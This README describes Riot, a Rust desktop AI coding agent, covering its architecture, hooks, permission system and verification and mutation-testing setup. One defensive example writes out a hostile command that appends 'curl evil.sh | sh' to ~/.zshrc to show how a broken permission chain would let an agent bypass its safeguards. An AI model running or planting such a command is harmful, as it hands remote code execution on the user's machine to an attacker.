# Riot

一个 Rust 实现的 AI coding agent 桌面端。

## 这个项目的开发方式

代码主要由 AI 编写，人负责架构与验证体系。这个前提决定了仓库的组织方式：

- **架构约束写在文档里，不是留在脑子里。** `docs/ARCHITECTURE.md` 中标注 `[约束]` 的条目是硬性要求，标注 `[取舍]` 的说明了为什么不选另一条路。
- **正确性靠断言保证，不靠 review 代码。** Agent 的 bug 大多是"编译通过、类型正确、看起来合理"的那种。`docs/VERIFICATION.md` 定义了四层防线。
- **非确定性被 clippy 禁掉。** 内核里不能直接调 `SystemTime::now()`、`std::fs`、`std::process`，一律走注入的 trait。这不是洁癖，是黄金回放测试能成立的前提。

## 文档

| 文档                                           | 内容                                                           |
| ---------------------------------------------- | -------------------------------------------------------------- |
| `[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)` | 进程架构、主循环、工具系统、权限、上下文管理、TS→Rust 翻译对照 |
| `[docs/VERIFICATION.md](docs/VERIFICATION.md)` | 四层验证体系与 review 清单                                     |

## 目录

```
crates/
  riot-protocol/     宿主、内核、前端共享的契约。依赖图的叶子。
  riot-core/         主循环、状态机、不变量断言
  riot-tools/        工具实现
  riot-providers/    模型适配层
  riot-permissions/  权限决策、Bash AST 分析
  riot-store/        会话持久化（append-only JSONL transcript）
  riot-mcp/          MCP 客户端（stdio 服务器、工具适配、连接枢纽）
  riot-runtime/      文件系统、进程、网络的可注入真实实现
  riot-kernel/       内核二进制（阶段 B 启用）
  riot-browser/      CEF 离屏浏览器子进程（独立 workspace，不进主构建）
src-tauri/              Tauri 宿主：窗口、会话、浏览器、终端、权限
  src/kernel/           进程监管 + 事件合批
  src/browser/          浏览器子进程、CDP 操作、域名同意
  src/fence.rs          项目目录的校验与规范化
  tests/                进程生命周期 / 浏览器 e2e
src/                    React 前端
  bridge/               唯一允许调用 Tauri API 的地方
schemas/                从 Rust 类型生成，勿手改
docs/
```

两条不可逆的依赖方向：

- `protocol ← core ← kernel`，`core` 不得依赖任何 UI 代码。违反的后果不是不好看，是以后拆进程时会发现拆不开。
- 前端只能通过 `src/bridge/` 访问宿主。别处直接 import `@tauri-apps/api` 会让前端无法脱离 Tauri 运行，组件测试和 Storybook 全部失效。

宿主和内核共享 `riot-protocol`，所以协议一致性由**编译器**保证，对不上直接编译失败。生成 JSON Schema 只是为了给 TypeScript 那一侧用——它没法共享 Rust 类型。

## 跑起来

```bash
# 1. 密钥只从环境变量读，不进配置文件
export DEEPSEEK_API_KEY=sk-...

# 2. 先在终端确认这条链路通了。GUI 会把配置问题藏起来 ——
#    key 没读到、base URL 写错、模型名不存在，在界面上都表现为"没反应"
cargo run -p riot-providers --example smoke

# 3. 起桌面端。第一次会让你选一个项目目录
pnpm tauri dev
```

从 Dock 或访达启动的应用**继承不到 shell 的环境变量**，这是 macOS 的行为。
用 `pnpm tauri dev`，或者从已经 export 过的终端启动。

换模型：

```bash
MODEL=deepseek-reasoner cargo run -p riot-providers --example smoke

BASE_URL=https://api.moonshot.cn MODEL=kimi-k2-turbo-preview \
  KEY_ENV=MOONSHOT_API_KEY cargo run -p riot-providers --example smoke
```

Anthropic 和 OpenAI 兼容服务走两套报文，由配置里的 `provider` 字段选择。
DeepSeek、Kimi、Qwen、OpenRouter、vLLM、Ollama 都是后者。

## 扩展点

都是普通文件，改完下一轮对话生效，不用重启。`<配置目录>` 在设置 → 关于里能看到（macOS 是 `~/Library/Application Support/riot`）。

| 能力 | 全局 | 项目级 | 是什么 |
|---|---|---|---|
| 记忆 | `<配置目录>/AGENTS.md` | `<项目>/AGENTS.md`（回退 `CLAUDE.md`） | 注入首条消息的项目约定，支持 `@路径` 引用 |
| Skills | `<配置目录>/skills/<名>/SKILL.md` | `<项目>/.riot/skills/` | 渐进披露的工作流：清单进上下文，正文用到才读 |
| 斜杠命令 | `<配置目录>/commands/*.md` | `<项目>/.riot/commands/` | 提示词模板，输入框敲 `/` 调用 |
| `@` 文件引用 | — | 输入框敲 `@` | 点名的文件连内容一起发给模型（也能写在命令模板里） |
| Hooks | `<配置目录>/hooks.json` | `<项目>/.riot/hooks.json` | 生命周期检查脚本（两层**叠加**，都会跑） |
| MCP | 设置 → MCP | — | 外部工具服务器，走同一套权限管线 |

斜杠命令：frontmatter 可省略，模板里 `$ARGUMENTS` 是整段参数、`$1..$9` 是第 N 个（引号内算一个）；子目录变命名空间（`commands/git/pr.md` → `/git:pr`）。内置 `/compact` 手动压缩历史。

`@` 引用：敲 `@` 出文件补全（子序列匹配，`smrs` 能找到 `src/main.rs`），选中后变成输入框里的一个块（可点掉、空输入时退格删最后一个），正文里不留 `@xxx` 字样；发送时把文件内容一起带上并登记进工作集 —— 模型可以直接改，不用先 Read 一遍。单个文件 24 KB 封顶、一条消息合计 64 KB，超出的截断并告诉模型剩下的自己读；`@目录` 列出条目；路径带空格写 `@"a b/c.md"`。邮箱、行内代码里的 `@`、以及 `@这里` 这类中文口语不会被当成引用。

Hooks 的四个检查点和协议（对齐 Claude Code，配置可直接拷）：

```json
{
  "PreToolUse":  [{ "matcher": "Bash|Write",
                    "hooks": [{ "type": "command", "command": "./check.sh", "timeout": 30 }] }],
  "PostToolUse": [{ "matcher": "Write", "hooks": [{ "type": "command", "command": "cargo fmt --check" }] }],
  "Stop":        [{ "hooks": [{ "type": "command", "command": "cargo test -q" }] }],
  "UserPromptSubmit": [{ "hooks": [{ "type": "command", "command": "./scan-secrets.sh" }] }]
}
```

脚本从 stdin 收一行事件 JSON（`hook_event_name`、`cwd`、`tool_name`、`tool_input`、`prompt`、`stop_hook_active`…）。**exit 2 = 拦下**，stderr 是给模型看的理由；exit 0 的 stdout 作为补充上下文，若是 JSON 还能给 `hookSpecificOutput.permissionDecision`（allow/deny/ask）和 `updatedInput`。别的退出码只记日志——检查脚本坏了不该拦住整条链路。

一条安全边界：hook 的 `allow` 只能免掉例行询问，**压不过**安全检查（写 SSH 密钥、凭证文件、命令注入之类）和你自己写的 ask 规则。否则 clone 一个带 `hooks.json` 的仓库就等于关掉整套防线。

## 开发

```bash
pnpm install
pnpm tauri dev                  # 桌面端
pnpm dev                        # 只跑前端（bridge 调用会失败，但布局能看）

# 迭代时用 check，比 build 快得多
cargo check --workspace

cargo test --workspace          # 不变量断言只在 debug 下 panic，这一步不能只跑 release
cargo clippy --workspace --all-targets -- -D warnings
pnpm typecheck

# 改了 protocol 里的类型后必须重新生成，CI 会检查两者是否同步
pnpm gen
```

`pnpm gen` 里带一个 tag 撞名检查。newtype variant 在 serde 的 internally-tagged 表示下会把内层字段摊平，内外层 tag 同名时产物是重复 key，反序列化直接失败——这在 Rust 类型层面完全看不出来。

### 建议装的加速工具

Rust 的编译时间会成为 AI 迭代的瓶颈。这两个装完之后 `.cargo/config.toml` 里取消对应注释：

```bash
cargo install sccache        # 跨项目编译缓存
brew install llvm            # 提供 lld 链接器
```

## 当前状态

搜索工具（Glob / Grep）和 `@` 文件补全用的是 ripgrep 的**库**（`ignore` / `grep-searcher`），不是它的二进制：桌面应用不能假设用户装了 `rg` 且它恰好在 PATH 里 —— 从 Dock 启动的应用连 shell 的 PATH 都继承不到，`brew install` 也救不了。gitignore 语义、二进制跳过、上下文行都和 rg 同源，遍历改成串行 + 按路径排序，换来同一次调用两次给出同样的结果。

M2 阶段，**能对着真实模型跑起来了**。1046 个测试 + 11 个黄金用例 + 53 个变异 + 500 seed 混沌长跑。已完成：

- 协议层类型定义、JSON Schema 生成、TypeScript 绑定
- 主循环 `stream!` 状态机：扣留机制、恢复路径、中断补齐、轮数上限
- Provider 层：SSE 解析、流解码、重试退避、模型降级、prompt caching 断点
- 工具层：注册表、并发分批、结果保序、兄弟级联、配对兜底
- 权限层：七步决策链、bypass 免疫的安全检查、规则匹配
- Bash 分析：tree-sitter AST 白名单、子命令拆分、安全包装剥离、只读判定
- 文件工具：Read / Write / Edit，含编码保真、先读后写协议、TOCTOU 复查
- 子进程工具：Bash（非交互环境、输出保尾截断）、Grep（argv 传参、退出码语义）
- 五层验证体系全部落地（L1 契约 / L2 不变量 / L3 黄金回放 / L4 故障注入 / L5 端到端）
- Tauri 宿主骨架：内核进程监管、事件合批
- OpenAI 兼容适配：DeepSeek / Kimi / Qwen / vLLM 共用一套报文，含工具调用与 `reasoning_content`
- 真实基础设施：reqwest HTTP、进程执行器、文件系统（临时文件 + rename 原子写）
- 会话接线：内核以 library 内嵌在 Tauri 进程里，事件经 Channel 推到前端
- 权限闸：决策链接进调度器，`ask` 走弹窗，超时按拒绝处理
- 前端：流式气泡、可折叠工具卡片、权限确认弹窗、首次配置引导
- CI 流水线（内核在 Linux，宿主在 macOS + Windows 双平台）

已接的：会话持久化（JSONL transcript + 索引，重启恢复）；MCP（stdio 服务器，工具与内置工具走同一套权限管线，会话间共享连接）；Skills（SKILL.md 渐进披露）；工具目录瘦身（超阈值延迟加载 + ToolSearch，纯客户端实现）；记忆文件（AGENTS.md 全局 + 项目两层，支持 @路径 引用，注入首条消息、压缩后重注）；规划模式闭环（只读侦察 → ExitPlanMode 提交计划 → 批准选执行档，同轮生效）；TodoWrite 任务清单；分层压缩（清旧工具结果 → LLM 九节式总结，主动阈值 + 413 反应式两条触发路径，压缩后重注工作集文件）；子 agent（Task 工具，general-purpose / explore 两型，与父共用权限闸，transcript 独立落盘）；队列消息（模型跑动中插话进输入框上方的排队面板 —— Cursor 同款交互：排队的消息等当前任务**完全跑完**才自动发出、变成对话气泡，中途不插队；想立刻处理就在面板点 ↑，停掉当前轮优先发这条；条目还可撤回编辑、删除；中断/满轮的残留自动接力成新轮，出错的留在面板等用户处置）；Hooks（`hooks.json` 全局 + 项目叠加，四个检查点 PreToolUse / PostToolUse / Stop / UserPromptSubmit，协议对齐 CC：stdin 一行事件 JSON、exit 2 阻断且 stderr 是给模型的理由、stdout JSON 可给 allow/deny/ask 与补充上下文，同事件并行跑、同命令去重、超时和坏脚本一律降级成"没意见"不拦链路）；斜杠命令（`commands/*.md` 全局 + 项目，子目录变命名空间，frontmatter 可选，`$ARGUMENTS` / `$1..$9` 展开且带引号成词，输入框 `/` 补全菜单，内置 `/compact`）。

还没接的：内核拆独立进程（M4）。

内核暂时是 library 而不是独立进程。这不是偷懒，是顺序问题：进程边界要解决的是崩溃隔离和资源限制，而在主循环的正确性还没被真实模型验证过之前，那层边界只会让每一次调试多一跳。`AgentDeps` 本来就是按"能被替换"设计的，拆的时候形状不用变。

### 验证体系抓到的真 bug

十二个，没有一个是靠读代码发现的：

| 问题                                           | 谁抓到的                      | 后果                                 |
| ---------------------------------------------- | ----------------------------- | ------------------------------------ |
| `StreamDelta` 与 `AgentEvent` 的 tag 撞名      | roundtrip 测试                | 前端一个 token 都收不到              |
| 内核优雅退出后它 spawn 的子进程变孤儿          | 进程生命周期测试              | 机器越跑越慢，功能全对               |
| `path.exists()` 不代表内容已写入               | 千次启停                      | 快速循环下随机失败                   |
| 压缩破坏 `tool_use`/`tool_result` 配对         | 混沌长跑（500 seed 中 10 个） | 压缩后的下一次请求必定 400           |
| "提前 drop 不误报"的测试根本没跑到 drop        | clippy `drop_non_drop`        | 一个永远绿的假测试                   |
| 中文字符被 TCP 分片切断 → 乱码                 | L5 端到端                     | 中文回复静默损坏，不报错不崩溃       |
| 重试抖动实际是单向的                           | 抖动分布断言                  | 同时失败的请求挤在一起重试，等于没抖 |
| 工具的 `allow` 会绕过安全检查                  | 变异测试                      | Bash 判定 `echo` 无害就能改 `.zshrc` |
| symlink 目标不查路径形状                       | 变异测试                      | 链接指向 ADS/设备名时形状检查失效    |
| 401 被重试 10 次                               | provider 重试计数断言         | 用户干等一分多钟才看到"密钥无效"     |
| `Write::call` 里的先读后写检查从没被执行过     | 变异测试                      | 权限弹窗期间的用户改动被静默覆盖     |
| 一个被中断的变异测试把"不包进程组"留在了源码里 | 全量测试耗时异常              | 每条带后台进程的命令都卡满 30 秒超时 |

五个值得展开。

**压缩破坏配对**：11 个黄金用例一个都没触发它，因为它们的消息序列太短，压缩后首尾正好覆盖全部。混沌测试的价值就在这里——它生成的组合是人想不到的。

**中文乱码**：这个 bug 是架构层面的。我原本在 `HttpTransport` 的契约里写了"调用方保证不在字符中间切断"，但 TCP 分片根本不认字符边界——中文回复里几乎每次请求都会切断。把重组责任推给每个 HTTP 客户端实现是错的，漏掉的那个会产生 `看��了`，而它不报错、不崩溃，只是内容悄悄坏掉。修复是让 `SseParser` 收 `&[u8]` 而不是 `&str`，重组在解析器内部统一做。L3 抓不到它，因为 `ScriptedProvider` 根本不经过字节层。

`call` **里的检查从没被执行过**：`覆盖已存在的文件要先读` 这个测试是有的，但它走 `validate_input` —— 那一层先拦住了，`call()` 里的同一段检查整段删掉都不会有测试失败。而真实管线是 `validate_input → 权限弹窗（等用户，没有时间上界）→ call`，`call` 里那次复查才是唯一拦得住 TOCTOU 的地方。补测试之后变异**还是存活**：新测试只断言了 `!is_ok`，而变异后工具仍然拒绝，只是理由从"你还没读过"变成了"文件内容对不上"。这个区别对模型是实打实的——前者让它先读，后者让它以为有人在并发改文件，白跑一轮。**断言"失败了"往往不够，要断言"以正确的理由失败"。**

**活在仓库里的变异**：变异脚本用 `try/finally` 恢复源码，但那挡不住 SIGKILL——一次被强杀的运行把"Unix 下不包进程组"留在了 `proc.rs` 里。它编译通过、绝大多数测试照样绿，唯一的症状是 `cargo test --workspace` 从几秒变成六十多秒：后台进程继承了 stdout 管道，不杀掉它就永远等不到 EOF。修复是把原文落盘备份，下次启动自动检测并恢复。**能扛住强杀的清理必须落盘，进程内的** `finally` **不算数。**

**401 重试 10 次**：这个 bug 原本被测试替身掩盖了。`ScriptedTransport` 在脚本耗尽时返回的是可重试的传输错误，于是 provider 一直空转到次数上限，而"重试了几次"这个断言就永远测不准。改成返回不可重试的 400 之后，问题立刻暴露。**测试替身的默认行为也是需要 review 的设计决策**——它不该比真实实现更宽容。

### 已经验证过的防线

光有防线不够，得确认它们真的会响。这两条都实际拆过一次：

`FuturesUnordered` **禁令。** 把 `scheduler.rs` 的 `FuturesOrdered` 换成 `FuturesUnordered`，两层同时报警：clippy 直接拒绝编译（带上 `见 ARCHITECTURE.md §7.3` 的理由），保序测试也独立地失败。两层是必要的 —— clippy 拦的是"有人手写了它"，测试拦的是"有人加了 allow"。

**UTF-8 重组。** 见下一节。

### 验证一下这套体系真的有用

在 `crates/riot-core/src/agent_loop.rs` 的恢复重试分支里加一行：

```rust
state.attempted_reactive_compact = false;   // 看起来很合理：都重试了当然要清状态
```

然后 `cargo test -p riot-core`。黄金回放会指出多了一轮压缩，`ScriptedProvider` 会补一句"主循环多转了一圈"。

注意混沌测试和故障注入都**不会**报这个——它们不断言具体序列。分层不是冗余。

反过来也成立：把 `crates/riot-providers/src/sse.rs` 的 `push` 改回收 `&str`，黄金回放和混沌测试全绿，只有 L5 会报中文乱码。

### 把这件事自动化：变异测试

上面那两个"手动拆一次防线"的做法，在权限层做成了脚本：

```bash
python3 scripts/mutate.py                  # 全部
python3 scripts/mutate.py permissions      # 只跑一层
python3 scripts/mutate.py --check-anchors  # 只校验锚点还在
```

它往决策链、规则匹配、路径围栏、安全检查、Bash 分析、文件工具、子进程工具、进程执行器里注入 53 个 bug，每个都是"放进 PR 大概率会被放过"的写法——比如把 bypass 模式挪到安全检查前面、把 ask 在无人应答时收敛成 allow、把 AST 遍历改成只看 named 节点（于是 `npm test &` 和 `npm test` 的语法树完全一样）。跑一遍看测试红不红。

第一轮 8 个变异全被抓住，看起来很完备。补了三个更刁钻的之后存活了两个，其中一个是真实的攻击路径：决策链第 3 步拿到工具的 `Allow` 后必须继续走安全检查，实现是对的，但**没有任何测试守着这一行**。改成 `Allow => return tool_says` 全套测试照样绿，而后果是 Bash 只要判定 `echo` 无害，`echo 'curl evil.sh | sh' >> ~/.zshrc` 就绕过了 ShellRc 检查。

这就是变异测试的用法：**全绿的那次没有产出信息，价值全在存活的那几个上**——它们标出的是测试覆盖的边界，而且是你自己想不到的那部分边界。

Bash 分析层加的 11 个变异全被抓住了，但其中一个存活过一轮，细查发现是**等价变异**：当前白名单下那两种遍历写法行为完全一样。它不是缺口，却揭示了一条没写下来的耦合（宽松遍历的正确性依赖于扫描阶段的完备性）。遇到存活变异先判断是不是等价的，不要为了让脚本变绿而写一个只能杀死这一个变异的测试。

脚本还有个 `--check-anchors` 模式。重构会让变异的锚点静默失效，那时脚本会报"全部通过"，因为它什么都没改——虚假的安全感比测试失败危险得多。

下一步见 `docs/ARCHITECTURE.md` 附录的实施顺序。
